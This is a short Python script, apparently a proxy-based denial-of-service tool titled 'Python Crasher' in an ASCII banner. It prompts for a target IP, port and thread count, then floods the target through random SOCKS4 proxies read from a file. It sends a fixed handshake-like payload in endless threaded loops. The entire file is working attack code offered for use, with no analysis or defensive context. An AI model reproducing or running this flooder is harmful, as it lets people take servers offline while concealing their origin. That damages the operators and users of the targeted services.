import socket
import socks
import random
import threading


print ("██████╗░██╗░░░██╗████████╗██╗░░██╗░█████╗░███╗░░██╗  ░█████╗░██████╗░░█████╗░░██████╗██╗░░██╗███████╗██████╗░")
print ("██╔══██╗╚██╗░██╔╝╚══██╔══╝██║░░██║██╔══██╗████╗░██║  ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░██║██╔════╝██╔══██╗")
print ("██████╔╝░╚████╔╝░░░░██║░░░███████║██║░░██║██╔██╗██║  ██║░░╚═╝██████╔╝███████║╚█████╗░███████║█████╗░░██████╔╝")
print ("██╔═══╝░░░╚██╔╝░░░░░██║░░░██╔══██║██║░░██║██║╚████║  ██║░░██╗██╔══██╗██╔══██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗")
print ("██║░░░░░░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚███║  ╚█████╔╝██║░░██║██║░░██║██████╔╝██║░░██║███████╗██║░░██║")
print ("╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝  ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝")
print("")
print("")
print("")

ip = input("Enter Server IP: ")
port = int(input("Enter Server Port: "))
threads = int(input("threads: "))

proxies = open('working.txt').readlines()
data = b'\x0f\x00/\tlocalhostc\xdf\x02'

def attack():
  proxy = random.choice(proxies).strip().split(":")
  while True:
    for i in range (threads):
      try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setblocking(0)
        s.connect((str(ip), int(port)))
        s.send(data)
        s.close()
        print("Proxy: "+proxy[0]+":"+proxy[1]+", connected")
      except:
        print("Proxy: "+proxy[0]+" is dead")

def sendattack():
  for i in range(threads):
    th = threading.Thread(target = attack)
    th.setDaemon(False)
    th.start()

sendattack()
